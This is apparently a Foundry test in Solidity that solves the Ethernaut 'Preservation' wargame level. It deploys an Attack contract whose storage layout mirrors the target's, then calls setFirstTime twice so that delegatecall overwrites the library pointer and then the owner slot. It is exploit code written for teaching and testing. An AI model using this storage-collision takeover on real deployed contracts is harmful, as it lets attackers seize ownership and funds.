// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./PreservationFactory.sol";

contract PreservationTest is Test {
    PreservationFactory factory;

    function setUp() public {
        factory = new PreservationFactory();
    }

    function testPreservation() public {
        address preservation = factory.createInstance(address(this));

        address attack = address(new Attack());

        Preservation(preservation).setFirstTime(uint256(uint160(attack)));
        Preservation(preservation).setFirstTime(uint256(uint160(address(this))));

        assertTrue(factory.validateInstance(payable(address(preservation)), address(this)));
    }
}

contract Attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}
